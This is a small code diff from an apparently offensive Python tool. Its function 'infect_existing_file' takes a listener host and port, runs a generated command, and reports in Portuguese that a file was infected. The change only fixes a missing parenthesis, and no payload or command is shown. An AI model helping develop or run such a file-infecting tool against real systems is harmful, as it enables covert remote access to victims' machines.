@@ -41,7 +41,7 @@ def infect_existing_file(file_path, lhost, lport):
         subprocess.call(cmd)
         print(f"Arquivo {output_name} infectado com sucesso.")
     except Exception as e:
-        print(f"Erro ao infectar o arquivo: {str(e}")
+        print(f"Erro ao infectar o arquivo: {str(e)}")
 
 def main():
     local_ip = get_local_ip()
